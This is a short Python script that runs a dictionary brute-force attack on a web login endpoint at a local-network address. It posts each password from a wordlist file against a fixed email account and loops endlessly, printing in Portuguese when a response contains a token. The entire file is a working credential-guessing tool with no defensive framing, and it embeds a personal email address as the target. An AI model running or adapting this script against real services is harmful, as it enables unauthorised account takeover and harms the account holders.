import requests
import random
import time

url = "http://192.168.86.249:8080/login"
home_url = "http://192.168.86.249:8080/"



session = requests.Session()

with open("passwordfile.txt") as f:
    passwords = f.readlines()

while True:
    for password in passwords:
        password = password.strip()

        headers = {
            "Content-Type": "application/json"
        }

        data = {
            "email": "nicolasjdc55@gmail.com",
            "password": password
        }

        try:
            r = session.post(url, json=data, headers=headers)

            print(f"Tentando: {password}")

            if "token" in r.text:
                print("SENHA ENCONTRADA:", password)

        except Exception as e:
            print("Erro:", e)

        time.sleep(0.5)
